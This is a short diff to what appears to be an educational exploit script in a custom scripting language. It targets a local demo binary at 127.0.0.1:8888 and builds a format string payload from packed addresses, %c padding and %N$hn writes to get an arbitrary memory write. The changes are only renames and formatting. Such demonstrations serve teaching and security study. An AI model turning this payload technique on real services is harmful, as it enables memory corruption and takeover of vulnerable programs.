@@ -2,10 +2,10 @@
 # Demonstrates arbitrary write using format string vulnerability
 
 print("[*] Format String Exploit")
-print("============================================================")
+print("=" * 60)
 
 let target = "127.0.0.1:8888"
-let binary = "./format_string_vuln"  # Compile from format_string_vuln.c in examples/
+let binary = "./format_vuln"
 
 print("[+] Target: " + target)
 print("[+] Binary: " + binary)
@@ -50,7 +50,7 @@ print("    High word: " + hex(value_high) + " -> " + hex(addr_high))
 let padding_low = value_low - 8  # Subtract address lengths
 let padding_high = value_high - value_low
 
-let payload = p64(addr_low) + p64(addr_high)
+let payload = pack64(addr_low) + pack64(addr_high)
 payload = payload + "%" + str(padding_low) + "c"
 payload = payload + "%" + str(offset) + "$hn"
 payload = payload + "%" + str(padding_high) + "c"  
